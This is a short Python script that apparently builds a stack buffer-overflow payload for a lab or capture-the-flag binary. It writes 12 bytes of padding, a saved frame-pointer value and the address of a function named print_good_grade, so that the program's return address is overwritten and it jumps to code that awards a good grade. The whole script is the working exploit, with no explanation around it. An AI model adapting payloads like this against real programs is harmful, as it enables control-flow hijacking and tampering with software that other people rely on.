from struct import pack
import sys

print("A"*12, flush=True, end='')		#offset is 12 
sys.stdout.buffer.write(pack("<I",0xfffe9058))	#ebp
sys.stdout.buffer.write(pack("<I",0x08049db9)) 	#address of print_good_grade


